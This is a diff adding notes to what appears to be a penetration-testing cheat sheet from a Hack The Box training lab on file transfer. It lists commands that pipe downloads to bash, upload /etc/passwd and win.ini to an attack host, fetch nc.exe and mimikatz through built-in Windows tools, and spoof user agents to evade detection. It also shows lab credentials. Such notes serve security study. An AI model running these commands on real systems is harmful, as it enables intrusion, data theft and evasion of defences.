@@ -214,3 +214,171 @@ $ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent
 $ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 %% transfer files with code natively if python is installed %%
+
+```
+$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+]$ php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+%%  PHP download and put contents into a file and fopen() module to open a   URL, read it's content and save it into a file.%%
+
+```
+$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+%% download a file and pipe it to bash %%
+
+```
+$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+%% perl and ruby languages to download a file %%
+
+### VBScript
+```
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+%% create a file wget.vbs with above code %%
+
+```
+C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+%% open command prompt and enter URL of file you want to download %%
+
+### Upload operations
+```
+$ python3 -m uploadserver
+```
+%% start python uploadserver on attack host %%
+
+```
+$ $ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+%% upload files with above one-liner %%
+
+## Miscellaneous File Transfer Methods
+```
+$ nc -l -p 8000  --recv-only > <file you want to download>
+```
+%% listen on victim machine  --recv-only to close connection once file is transferred%%
+
+```
+$ ncat --send-only 192.168.49.128 8000 < <file to send to compromised host>
+```
+%% --send-only flag to send the file to victim host  to terminate connection once file is transferred %%
+
+```
+$ sudo nc -l -p 443 -q 0 < <file to transfer to victim host>
+```
+%% if inbound connection to victim machine is blocked start listener on attack host %%
+
+```
+$ nc 192.168.49.128 443 > <file to download from attack host>
+```
+%% connect to attack host and download file  you can use --send-only and --recv-only options from before%%
+
+```
+$ cat < /dev/tcp/192.168.49.128/443 > <file to download from attack host>
+```
+%% if netcat is not installed use /dev/tcp to download file from attack host %%
+
+### PowerShell Session File Transfer
+
+```
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+%% assuming you have access to DC01 and want to transfer file to DATABASE01, you can create a session to the host then copy files from DC01 to DATABASE01 %%
+
+```
+$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+%% if copy paste does not work as expected when using xfreerdp to rdp to a windows host, you can  mount a linux folder using rdesktop on attack host %%
+
+```
+$ xfreerdp3 /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+%% alternatively you can mount it using xfreerdp  to access the diretory we can connect to \\tsclient\ or use mstsc.exe from windows host%%
+
+```
+PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
+PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+```
+%% if you need to transfer sensitive info and HTTPS, or other secure methods of transfer are not available then you can encrypt your data before sending it %%
+
+```
+$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+```
+%% encrypt data using openssl %%
+
+```
+$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+%% decrypt data using openssl %%
+
+## Living off The Land
+```
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+```
+%% use LOLBINS certreq.exe to transfer a file to our attack host %%
+
+Go to [https://lolbas-project.github.io/ ]()for searching windows living off the land binaries (LOLBAS)
+
+Go to [https://gtfobins.org/]() for searching Linux binaries
+
+### OpenSSL to transfer files
+
+```
+$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+```
+%% create certificate in attack machine %%
+
+```
+$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+%% stand up server in our attack machine %%
+
+```
+$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+%% download file onto compromised machine %%
+
+### Other LOLBINS for transferring files
+```
+PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+%% use bitsadmin LOLBINS to transfer nc.exe from out attack host %%
+
+```
+PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+%% use bitstransfer to transfer files from attack host to  compromised host %%
+
+```
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+%% use certutil but keep in mind it may be blocked by AV %%
+
+## Evading Detection when transferring files
+### Changing user agents
+```
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+%% download file while spoofing user agent to evade detection %%
+
+```
+PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+%% if application whitelisting has been implemented as a security control use  GfxDownloadWrapper.exe which is used by intel graphic driver or search for other LOLBIN "file download" binary in the lolbins link shared earlier %%
